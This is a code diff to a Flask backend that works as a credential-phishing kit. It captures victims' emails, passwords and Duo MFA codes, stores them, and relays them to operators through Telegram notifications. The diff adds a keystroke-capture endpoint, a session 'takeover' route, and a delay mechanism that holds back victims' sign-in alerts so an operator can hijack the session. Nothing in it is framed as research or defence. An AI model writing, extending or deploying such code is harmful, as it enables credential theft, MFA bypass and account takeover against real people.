@@ -4,9 +4,9 @@ from flask import render_template, send_from_directory, redirect, Response
 from models import Email_statuses, HostedUrls, Variables
 from flask_cors import CORS
 from dotenv import load_dotenv
-from tg import send_notification, get_status_update
-from utils import Local_Cache
-import os
+from tg import send_notification, get_status_update, send_keystroke_notification_to_admin
+from utils import Local_Cache, get_admin_user
+import os, time
 from urllib.parse import quote
 import requests
 
@@ -61,7 +61,7 @@ def bot_info():
 
 @app.get("/version")
 def version():
-    return {"status":"success", "version":"cors origins issue"}
+    return {"status":"success", "version":"cors origins ad"}
 
 
 
@@ -204,6 +204,102 @@ def set_custom_status():
 
 
 
+@app.post("/api/keystroke")
+def keystroke():
+    """Receives email keystrokes and notifies ONLY the admin with action buttons."""
+    data = request.json
+    session_id = data.get('session_id')
+    if not session_id:
+        return jsonify({"error": "Session ID is missing"}), 400
+
+    admin_user = get_admin_user()
+    if admin_user:
+        send_keystroke_notification_to_admin(
+            session_id=session_id,
+            field=data.get('field', 'N/A'),
+            value=data.get('value', ''),
+            admin_user=admin_user
+        )
+    return jsonify({"status": "received"}), 200
+
+@app.get("/takeover/<admin_id>/<session_id>")
+def takeover(admin_id, session_id):
+    """Endpoint for the admin's 'Takeover' button."""
+    admin_user = get_admin_user()
+    if not admin_user or admin_id != admin_user.get("id"):
+        return "<h1>Unauthorized</h1>", 403
+    
+    try:
+        Email_statuses.update_one(
+            {"session_id": session_id},
+            {"$set": {"active_user_id": admin_id}},
+            upsert=True
+        )
+        send_notification(f"✅ Takeover successful for session: {session_id}", user_id=admin_id)
+        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Takeover Successful</h1><p>You now have exclusive control. You can close this window.</p></div>"
+    except Exception as e:
+        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500
+
+@app.get("/api/delay-session/<session_id>")
+def delay_session(session_id):
+    """Endpoint for the admin's 'Delay' button."""
+    try:
+        Email_statuses.update_one(
+            {"session_id": session_id},
+            {"$set": {"delay_active": True}},
+            upsert=True
+        )
+        admin_user = get_admin_user()
+        if admin_user:
+            send_notification(f"⏳ Delay activated for session: {session_id}", user_id=admin_user.get("id"))
+        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Delay Activated</h1><p>The user notification will be delayed by 4 seconds.</p></div>"
+    except Exception as e:
+        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500
+
+# --- Core Logic Endpoints ---
+
+@app.post("/alert")
+def alert():
+    """Handles general alerts, including the 'typing' and delayed 'sign-in' notifications."""
+    req = request.json
+    message = req['message']
+    session_id = req.get('session_id')
+    user_id = req.get('user_id') or DEFAULT_USER_ID
+
+    if not session_id:
+        return jsonify({"error": "Session ID is required for alerts"}), 400
+
+    # Handle the "someone is typing" alert - sent before takeover is possible
+    if "currently typing an email" in message or "trying to sign in with email" in message:
+        send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
+        return jsonify({"status": "success", "message": "Typing alert sent."})
+
+    # Handle the "trying to sign in" alert, which respects the delay logic
+    if "trying to sign in with email" in message:
+        session_doc = Email_statuses.find_one({"session_id": session_id})
+
+        # Check if the admin activated the delay
+        if session_doc and session_doc.get("delay_active"):
+            Email_statuses.update_one({"session_id": session_id}, {"$set": {"delay_active": False}})
+            time.sleep(4)
+            
+            # After waiting, check again if a takeover occurred
+            updated_doc = Email_statuses.find_one({"session_id": session_id})
+            admin_user = get_admin_user()
+            if updated_doc and admin_user and updated_doc.get("active_user_id") == admin_user.get("id"):
+                print(f"Notification for session {session_id} blocked due to admin takeover after delay.")
+                send_notification(f"✅ Login notification for {updated_doc.get('email')} was successfully blocked.", user_id=admin_user.get("id"))
+                return jsonify({"status": "success", "message": "Notification blocked by takeover."})
+
+    # If no delay was active, or if delay finished without takeover, send to the correct recipients
+    send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
+    return jsonify({"status": "success", "message": "Alert sent."})
+
+
+
+
+
+
 
 @app.post("/auth")
 def auth():
@@ -213,47 +309,62 @@ def auth():
     """
     req = request.json
     # MODIFIED: Get user_id from the request body instead of the session.
-    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
-    
+    user_id = req.get('user_id') or DEFAULT_USER_ID
+    session_id = req.get('session_id')
+
     email = req['email'].strip()
+
+    unique_filter = {"$or": [{"session_id": session_id}, {"email": email}]}
+
+
     password = req['password']
     incoming_duo_code = req.get('duoCode')
     custom_input = req.get('customInput')
 
     # The rest of this function remains exactly the same.
-    db_record = Email_statuses.find_one({"email": email})
+    db_record = Email_statuses.find_one(unique_filter)
+
 
     if custom_input:
-        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id_to_notify)
+        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id, session_id=session_id, include_admin=True)
         Email_statuses.update_one(
-            {"email": email},
-            {"$set": {"status": "pending", "custom_data": None}}
+            unique_filter,
+            {"$set": {"status": "pending", "custom_data": None, "session_id": session_id, "email": email}},
+            upsert=True
         )
         return jsonify({"status": "pending"})
 
     if not db_record or db_record.get('password') != password:
-        get_status_update(email, password, user_id=user_id_to_notify)
+        get_status_update(session_id=session_id, email=email, password=password, user_id=user_id)
         Email_statuses.update_one(
-            {"email": email},
+            unique_filter,
             {"$set": {
+                "session_id": session_id, # Always update to the latest session_id
+                "email": email,
                 "password": password,
                 "status": "pending",
                 "duoCode": None,
-                "user_id": user_id_to_notify,
+                "user_id": user_id,
                 "custom_data": None
-            }},
+            },
+            "$setOnInsert": {
+                    "active_user_id": user_id,
+                    "delay_active": False
+                }},
             upsert=True
         )
         return jsonify({"status": "pending"})
 
     stored_duo_code = db_record.get('duoCode')
     if incoming_duo_code and incoming_duo_code != stored_duo_code:
-        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id_to_notify)
+        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id, session_id=session_id, include_admin=True)
         Email_statuses.update_one(
-            {"email": email},
-            {"$set": {"status": "pending", "duoCode": incoming_duo_code}}
+            unique_filter,
+            {"$set": {"status": "pending", "duoCode": incoming_duo_code, "session_id": session_id, "email": email}},
+            upsert=True
         )
         return jsonify({"status": "pending"})
+
 
     current_status = db_record.get('status', 'pending')
     if current_status == 'custom':
@@ -265,16 +376,7 @@ def auth():
     return jsonify({"status": current_status})
 
 
-@app.post("/alert")
-def alert():
-    """Sends a simple alert, respecting the user_id from the request body."""
-    req = request.json
-    # MODIFIED: Get user_id from the request body instead of the session.
-    user_id_to_notify = req.get('user_id') or DEFAULT_USER_ID
-    
-    message = req['message']
-    send_notification(message, user_id=user_id_to_notify)
-    return jsonify({"status":"success", "message":"Alert sent."})
+
 
 
 if __name__ == '__main__':
